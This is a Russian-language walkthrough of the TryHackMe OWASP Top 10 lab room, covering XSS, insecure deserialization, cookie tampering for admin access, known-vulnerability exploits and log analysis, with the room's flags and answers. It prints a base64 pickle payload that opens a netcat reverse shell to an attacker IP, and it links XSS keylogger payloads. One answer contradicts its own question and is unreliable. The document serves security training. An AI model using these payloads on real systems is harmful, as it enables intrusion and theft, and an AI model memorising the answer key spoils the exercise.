Написание HTML-кода (document.write) — замена HTML-кода веб-сайта на свой собственный (по сути, порча всей страницы).
XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) — вы можете регистрировать все 
нажатия клавиш пользователем, захватывая его пароль и другую конфиденциальную информацию, которую он вводит на 
веб-странице.  
Сканирование портов (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) — мини-сканер локальных 
портов (более подробная информация об этом представлена в разделе TryHackMe XSS ). 
XSS -Payloads.com (http://www.xss-payloads.com/) — это веб-сайт, на котором размещены полезные нагрузки, инструменты,
документация и многое другое, связанные с XSS. Вы можете загрузить полезные нагрузки XSS, которые делают снимки с 
веб-камеры, или даже получить более мощный сканер портов и сетей.  

XSS Challenge

Виртуальная машина, подключенная к этой задаче, демонстрирует DOM-Based, Reflected и Stored XSS. Разверните машину 
и эксплуатируйте каждый тип! 

### Ответить на вопросы ниже
Развертывание виртуальной машины
```commandline
Ответ не нужен
```
Перейдите по  адресу http://MACHINE_IP/  в вашем браузере и щелкните вкладку «Reflected XSS» на панели навигации; 
создайте полезную нагрузку Reflected XSS, которая вызовет всплывающее окно с надписью «Привет». 
```commandline
ThereIsMoreToXSSThanYouThink
```
На той же странице отражения создайте отраженную полезную нагрузку XSS, которая вызовет всплывающее окно с 
IP-адресом вашего компьютера. 
```commandline
ReflectiveXss4TheWin
```
Теперь перейдите по  адресу http://MACHINE_IP/  в вашем браузере и  нажмите на вкладку «Сохраненные XSS» на панели 
навигации; создайте учетную запись.  
Затем добавьте комментарий и посмотрите, сможете ли вы вставить свой собственный HTML-код.
```commandline
HTML_T4gs
```
На той же странице создайте всплывающее окно с предупреждением, которое будет отображаться на странице с файлами 
cookie вашего документа. 
```commandline
W3LL_D0N3_LVL2
```
Измените «XSS Playground» на «Я хакер», добавив комментарий и используя Javascript.
```commandline
websites_can_be_easily_defaced_with_xss
```
## Задание 21
### .:. OWASP10 - A8: Небезопасная десериализация .:.
«Небезопасная десериализация — это уязвимость, которая возникает, когда ненадежные данные используются для 
злоупотребления логикой приложения» (Acunetix., 2017) 


Это определение все еще довольно широкое, если не сказать больше. Проще говоря, небезопасная десериализация заменяет 
данные, обрабатываемые приложением, вредоносным кодом, допуская все, от DoS (отказ в обслуживании) до RCE (удаленное 
выполнение кода), что злоумышленник может использовать для закрепления в сценарии пентестинга.  

В частности, этот вредоносный код использует законный процесс сериализации и десериализации, используемый 
веб-приложениями. Мы объясним этот процесс и то, почему он так распространен в современных веб-приложениях. 

OWASP оценивает эту уязвимость как 8 из 10 по следующим причинам :
- Низкая эксплуатируемость. Эта уязвимость часто возникает в каждом конкретном случае - для нее нет надежного 
  инструмента/фреймворка. Из-за ее природы злоумышленникам необходимо хорошо понимать внутреннюю работу ToE.  
- Эксплойт опасен настолько, насколько это позволяют навыки атакующего, и, более того, насколько ценны раскрываемые 
  данные. Например, тот, кто может вызвать только DoS, сделает приложение недоступным. Влияние этого на бизнес будет 
  различным для инфраструктуры - некоторые организации восстановятся без проблем, другие, однако, нет.  

### Что уязвимо?

В итоге, в конечном счете, любое приложение, которое хранит или извлекает данные, где нет никаких проверок валидации 
или целостности для запрашиваемых или сохраняемых данных. Несколько примеров приложений такого рода: 
- Сайты электронной коммерции
- Форумы
- API
- Среды выполнения приложений (Tomcat, Jenkins , Jboss и т. д.)

### Ответить на вопросы ниже
Кто разработал приложение Tomcat?
```commandline
The Apache Software Foundation
```
Какой тип атаки, приводящий к сбою служб, можно осуществить с помощью небезопасной десериализации?
```commandline
Denial of Service
```

## Задание 22
### Объекты
Объекты, являющиеся важным элементом объектно-ориентированного программирования (ООП), состоят из двух частей:
- Состояние
- Поведение

Проще говоря, объекты позволяют вам создавать похожие строки кода без необходимости проделывать сложную работу по 
повторному написанию тех же строк кода. 

Например, хорошим объектом будет лампа. Лампы могут иметь разные типы лампочек, это будет их состояние, а также быть 
включенными/выключенными — их поведение! 

Вместо того чтобы подстраиваться под каждый тип лампочек и учитывать, включена или выключена конкретная лампа, вы 
можете использовать методы, позволяющие просто изменять состояние и поведение лампы. 
### Ответить на вопросы ниже
Выберите правильный термин следующего утверждения:
если бы собака спала, это было бы:
A) Состояние
B) Поведение 
```commandline
A Behaviour
```

## Задание 23
### Де(Сериализация)

Обучение лучше всего осуществляется посредством аналогий.

Турист подходит к вам на улице и спрашивает дорогу. Он ищет местную достопримечательность и заблудился. К сожалению, 
английский язык не является его сильной стороной, и вы также не говорите на его диалекте. Что вы делаете? Вы рисуете 
карту маршрута к достопримечательности, потому что картинки преодолевают языковые барьеры, они смогли найти 
достопримечательность. Отлично! Вы только что сериализовали некоторую информацию, которую турист затем 
десериализовал, чтобы найти достопримечательность.    

### Продолжение

Сериализация — это процесс преобразования объектов, используемых в программировании, в более простой, совместимый 
формат для передачи между системами или сетями для дальнейшей обработки или хранения.

Десериализация — это обратный процесс: преобразование сериализованной информации в ее сложную форму — объект, 
понятный приложению. 

### Что это значит?
Допустим, у вас есть пароль "password123" из программы, который необходимо сохранить в базе данных на другой системе.
Для передачи по сети эту строку/вывод необходимо преобразовать в двоичный код. Конечно, пароль необходимо сохранить 
как "password123", а не в двоичной записи. Как только он попадает в базу данных, он преобразуется или 
десериализуется обратно в "password123", чтобы его можно было сохранить.

Процесс лучше всего объяснить с помощью диаграмм:
### Как мы можем это использовать?

Проще говоря, небезопасная десериализация происходит, когда данные от недоверенной стороны (например, хакера) 
выполняются из-за отсутствия фильтрации или проверки входных данных; система предполагает, что данные заслуживают 
доверия, и будет выполнять их без каких-либо ограничений.  
### Ответить на вопросы ниже
Как называется форматирование по основанию 2, в котором данные передаются по сети? 

```commandline
Binary
```

## Задание 24
### Печенье 101
Ах да, источник многих мемов. Файлы cookie являются важным инструментом для функционирования современных веб-сайтов. 
Крошечные фрагменты данных, они создаются веб-сайтом и хранятся на компьютере пользователя.  

В наши дни вы увидите уведомления, подобные приведенным выше, на большинстве веб-сайтов. Веб-сайты используют эти 
файлы cookie для хранения поведения, специфичного для пользователя, например, товаров в корзине или идентификаторов 
сеансов.  

В веб-приложении, которое мы собираемся эксплуатировать, вы заметите, что файлы cookie хранят информацию для входа, 
как показано ниже! Ужас! 

Хотя учетные данные в виде открытого текста сами по себе являются уязвимостью, это не небезопасная десериализация, 
поскольку мы не отправляли никаких сериализованных данных для выполнения! 

Файлы cookie не являются постоянными хранилищами, как базы данных. Некоторые файлы cookie, такие как идентификаторы 
сеансов, удаляются при закрытии браузера, другие, однако, сохраняются значительно дольше. Это определяется таймером 
«Expiry», который устанавливается при создании файла cookie.  

Некоторые файлы cookie имеют дополнительные атрибуты, их небольшой список приведен ниже:

### Создание файлов cookie
Файлы cookie могут быть установлены на различных языках программирования веб-сайтов. Например, Javascript, PHP или 
Python, чтобы назвать несколько. Следующее веб-приложение разработано с использованием Flask Python, поэтому его 
уместно использовать в качестве примера.  

Возьмем фрагмент ниже:

Настройка куки в Flask довольно тривиальна. Просто этот фрагмент получает текущую дату и время, сохраняет их в 
переменной "timestamp", а затем сохраняет дату и время в куки с именем "registrationTimestamp". Вот как это будет 
выглядеть в браузере.

Вот так просто.

.:. 

### Ответить на вопросы ниже
Если бы файл cookie имел путь  webapp.com/login  , какой URL-адрес должен был бы посетить пользователь?
```commandline
webapp.com/login
```
Какова аббревиатура веб-технологии, на основе которой  работают защищенные  файлы cookie?
```commandline
HTTPS
```

## Задание 25
Доступ к вашему экземпляру

В браузере устройства, с которого вы подключены к VPN, перейдите по адресу http:// MACHINE_IP.  Я подробно опишу 
шаги для Firefox - вам, возможно, придется изучить, как проверять файлы cookie в браузере по вашему выбору. Вас 
встретит домашняя страница:  

Давайте создадим учетную запись. Не нужно вводить данные TryHackMe, вы можете ввести то, что вам нравится.

Где вы будете перенаправлены на страницу вашего профиля. Обратите внимание, справа у вас есть ваши данные.

Щелкните правой кнопкой мыши страницу и нажмите «Просмотреть элемент». Перейдите на вкладку «Хранилище».

### Проверка закодированных данных
Вы увидите здесь, что есть файлы cookie, закодированные как в текстовом виде, так и в base64. Первый флаг будет 
найден в одном из этих файлов cookie. 

Изменение значений файлов cookie
Обратите внимание, что у вас есть файл cookie с именем "userType". В настоящее время вы являетесь пользователем, что 
подтверждается вашей информацией на странице "myprofile".

Это приложение определяет, что вы можете и не можете видеть по вашему типу пользователя. Что, если вы хотите стать 
администратором? 

Дважды щелкните левой кнопкой мыши по столбцу "Value" в "userType", чтобы изменить содержимое. Давайте изменим наш 
userType на "admin" и перейдем к http:// MACHINE_IP/admin  , чтобы ответить на второй флаг. 
### Ответить на вопросы ниже
1-й флаг (значение cookie-файла)
```commandline
THM{good_old_base64_huh}
```
2-й флаг (панель администратора)
```commandline
THM{heres_the_admin_flag}
```
## Задание 26
Гораздо более коварная атака, чем простое декодирование файлов cookie. Давайте перейдем к сути.

Настраивать
1. Сначала измените значение cookie-файла userType с «admin» на «user» и вернитесь на  http://MACHINE_IP/myprofile 
2. Затем щелкните левой кнопкой мыши по URL-адресу в «Exhange your vim», указанному на снимке экрана ниже.
3. После этого щелкните левой кнопкой мыши по URL-адресу в разделе «Оставьте свой отзыв!», после чего вы будете 
   перенаправлены на следующую страницу: 

### . Что делает эту форму уязвимой?

Если пользователь вводит свой отзыв, данные будут закодированы и отправлены в приложение Flask (предположительно, 
для хранения в базе данных, например). Однако приложение предполагает, что любые закодированные данные заслуживают 
доверия. Но мы хакеры. Вы можете доверять нам только в той степени, в которой вы можете нас забросить (а это 
практически невозможно в сети)   

Хотя объяснение программирования немного выходит за рамки этой темы, важно понимать, что происходит в приведенном 
ниже фрагменте: 

Когда вы посещаете URL-адрес "Exchange your vim", файл cookie кодируется и сохраняется в вашем браузере — идеально 
для того, чтобы мы могли его изменить! После того, как вы посещаете форму обратной связи, значение этого файла 
cookie декодируется, а затем десериализуется. Ой-ой. В приведенном ниже фрагменте мы можем увидеть, как файл cookie 
извлекается и затем десериализуется через pickle.loads 

Эта уязвимость использует Python Pickle, который я прикрепил в качестве материала для чтения в конце комнаты. По 
сути, у нас есть полная свобода действий, чтобы выполнить все, что мы захотим, например, обратную оболочку. 


### Эксплойт

Теперь я не собираюсь оставлять вас здесь в одиночестве. Сначала нам нужно настроить прослушиватель netcat на нашем 
Kali. Если вы подписчик, вы можете управлять своей собственной  машиной TryHackMe Kali в браузере. 

Поскольку десериализуемый код из формата base64, мы не можем просто так породить обратную оболочку. Мы должны 
закодировать наши собственные команды в base64, чтобы вредоносный код был выполнен. Я подробно опишу шаги ниже с 
предоставленным материалом для этого.  

После этого  скопируйте и вставьте исходный код из этого файла python (pickelme.py)  в свой kali и измените исходный 
код, заменив ваш "YOUR_TRYHACKME_VPN_IP" на ваш TryHackMe VPN IP.  Его можно получить на странице доступа.

1. Создайте файл Python для вставки. Для этих примеров я использовал «rce.py»:
2. Вставьте код с сайта GitHub, заменив YOUR_TRYHACKME_VPN_IP на ваш TryHackMe VPN IP со страницы доступа.
3. Выполните "rce.py" через python3 rce.py
4. Обратите внимание на вывод команды, он будет выглядеть примерно так:
5. Скопируйте и вставьте все,  что находится между двумя речевыми знаками  ('DATA'). В моем случае я скопирую и вставлю:
gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI
   +JjEgfCBuZXRjYXQgMTAuMTEuMy4yIDQ0NDQgPiAvdG1wL2aUhZRSlC4=    Ваш текст может выглядеть немного иначе, просто 
   убедитесь, что вы скопировали все, что находится между двумя речевыми знаками. ''  
6. Вставьте это в cookie-файл «encodedPayload» в вашем браузере:
7. Убедитесь, что наш прослушиватель netcat все еще работает:
8. Обновите страницу. Она зависнет, обратитесь к вашему прослушивателю netcat:

Если вы выполнили шаги правильно, теперь у вас будет удаленная оболочка для вашего экземпляра. Никакого повышения 
привилегий, ищите флаг flag.txt! 

### Ответить на вопросы ниже
флаг.txt

```commandline
4a69a7ff9fd68
```

## Задание 27
Иногда вы можете обнаружить, что компания/организация, которую вы проверяете на проникновение, использует программу, 
которая уже имеет хорошо документированную уязвимость.

Например, предположим, что компания не обновляла свою версию WordPress несколько лет, и с помощью такого инструмента,
как wpscan, вы обнаруживаете, что это версия 4.6. Небольшое быстрое исследование покажет, что WordPress 4.6 уязвим 
для эксплойта неаутентифицированного удаленного выполнения кода (RCE), и что еще лучше, вы можете найти эксплойт, 
уже созданный на  Exploit-db.   

Как вы можете видеть, это было бы довольно разрушительно, потому что это требует очень мало работы со стороны 
злоумышленника, так как часто, поскольку уязвимость уже хорошо известна, кто-то другой сделал эксплойт для 
уязвимости. Ситуация становится еще хуже, когда вы понимаете, что это действительно очень легко сделать, если 
компания пропускает одно обновление для программы, которую она использует, она может быть уязвима для любого 
количества атак.

Вот почему OWASP присвоил этому уязвимости оценку 3 (что означает высокий уровень) по шкале распространенности: 
компания невероятно легко может пропустить обновление приложения. 

### Ответить на вопросы ниже
Читайте выше.
```commandline
Ответ не нужен
```

## Задание 28
Напомним, что поскольку речь идет об известных уязвимостях, большая часть работы уже сделана за нас. Наша главная 
задача — найти информацию о программном обеспечении и исследовать ее, пока не найдем эксплойт. Давайте рассмотрим 
это на примере веб-приложения.  

### Ностромо 1.9.6
Что вы знаете, этот сервер использует страницу по умолчанию для веб-сервера nostromo. Теперь, когда у нас есть номер 
версии и имя программного обеспечения, мы можем использовать  Exploit-db  , чтобы попытаться найти эксплойт для этой 
конкретной версии.  

(Примечание: Exploit-db невероятно полезен, и всем новичкам, вам придется  часто  его использовать , поэтому лучше 
освоиться с ним) 

Нам повезло, что верхний результат оказался скриптом-эксплойтом. Давайте скачаем его и попробуем выполнить код. 
Запуск этого скрипта сам по себе на самом деле преподает нам очень важный урок. 

Это может не сработать с первого раза. Полезно иметь понимание языка программирования, на котором написан скрипт, 
чтобы при необходимости можно было исправить любые ошибки или внести какие-либо изменения, поскольку довольно много 
скриптов на Exploit-db ожидают, что вы внесете изменения.  

К счастью для нас, ошибка была вызвана строкой, которую следовало закомментировать, так что ее легко исправить.

Исправив это, попробуем снова запустить программу.
Бум! У нас есть RCE. Здесь важно отметить, что большинство скриптов просто сообщат вам, какие аргументы вам нужно 
предоставить, разработчики эксплойтов редко заставят вас читать потенциально сотни строк кода только для того, чтобы 
понять, как использовать скрипт.  

Стоит также отметить, что это не всегда так просто: иногда вам просто сообщат номер версии, как в этом случае, но в 
других случаях вам, возможно, придется покопаться в исходном коде HTML или даже угадать скрипт эксплойта. Но если 
говорить реалистично, если это известная уязвимость, то, скорее всего, есть способ узнать, какая версия работает в 
приложении.   

Вот и все, самое замечательное в этой части OWASP 10 то, что работа практически уже сделана за нас, нам нужно только 
провести некоторые базовые исследования, и как тестировщик на проникновение вы уже делаете это в значительной 
степени :).  

### Ответить на вопросы ниже
Прочитайте вышеизложенное!
```commandline
Ответ не нужен
```

## Задание 29
Ниже приведено уязвимое приложение, всю информацию, необходимую для его эксплуатации, можно найти в Интернете. 
Примечание: Когда вы найдете скрипт эксплойта, заключите все введенные данные в кавычки, например «id»

### Ответить на вопросы ниже
Сколько символов в /etc/passwd (используйте wc -c /etc/passwd, чтобы получить ответ)

```commandline
1611
```

## Задание 30
При настройке веб-приложений каждое действие, выполняемое пользователем, должно регистрироваться. Регистрация важна, 
поскольку в случае инцидента действия злоумышленников можно отследить. После отслеживания их действий можно 
определить их риск и воздействие. Без регистрации невозможно будет узнать, какие действия совершил злоумышленник, 
получив доступ к определенным веб-приложениям. К наиболее серьезным последствиям относятся:

Ущерб, наносимый нормативным актам: если злоумышленник получил доступ к персональным данным пользователя и об этом 
нет никаких записей, то страдают не только пользователи приложения, но и владельцы приложения могут быть оштрафованы 
или подвергнуты более строгим мерам в зависимости от нормативных актов.  
риск дальнейших атак: без регистрации присутствие злоумышленника может остаться незамеченным. Это может позволить 
злоумышленнику начать дальнейшие атаки против владельцев веб-приложений, похищая учетные данные, атакуя 
инфраструктуру и т. д.  
Информация, хранящаяся в журналах, должна включать:
- Коды статуса HTTP
- Временные метки
- Имена пользователей
- Конечные точки API /расположения страниц
- IP-адреса
Эти журналы содержат некоторую конфиденциальную информацию, поэтому важно обеспечить их безопасное хранение и 
  хранение нескольких копий журналов в разных местах. 

Как вы могли заметить, ведение журнала становится более важным после того, как произошел взлом или инцидент. 
Идеальный случай — это мониторинг для обнаружения любой подозрительной активности. Цель обнаружения этой 
подозрительной активности — либо полностью остановить злоумышленника, либо уменьшить нанесенное им воздействие, если 
его присутствие было обнаружено намного позже, чем предполагалось. Распространенные примеры подозрительной 
активности включают:    
- многократные несанкционированные попытки выполнения определенного действия (обычно попытки аутентификации или 
  доступа к несанкционированным ресурсам, например, страницам администратора) 
- запросы с аномальных IP-адресов или местоположений: хотя это может указывать на то, что кто-то другой пытается 
  получить доступ к учетной записи конкретного пользователя, возможен и процент ложных срабатываний.
- использование автоматизированных инструментов: конкретный автоматизированный инструментарий может быть легко 
  идентифицирован, например, с использованием значения заголовков User-Agent или скорости запросов. Это может 
  указывать на то, что злоумышленник использует автоматизированный инструментарий. 
- распространенные полезные нагрузки: в веб-приложениях злоумышленники часто используют полезные нагрузки Cross Site 
  Scripting ( XSS ). Обнаружение использования этих полезных нагрузок может указывать на присутствие кого-то, 
  проводящего несанкционированное/вредоносное тестирование приложений. 
Простое обнаружение подозрительной активности не поможет. Эту подозрительную активность необходимо оценить по уровню 
  воздействия. Например, некоторые действия будут иметь более сильное воздействие, чем другие. На эти действия с 
  более сильным воздействием необходимо реагировать раньше, поэтому они должны поднять тревогу, которая привлечет 
  внимание соответствующей стороны.   

### Примените эти знания на практике, проанализировав этот пример файла журнала.

### Ответить на вопросы ниже
Какой IP-адрес использует злоумышленник?
```commandline
49.99.13.16
```
Какой тип атаки осуществляется?
```commandline
Brute Force
```
## Задание 31
Что дальше?
Почему бы не записаться на наш курс начального уровня или не найти другую комнату для прохождения курса?
### Ответить на вопросы ниже
Прочитайте вышеизложенное!
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)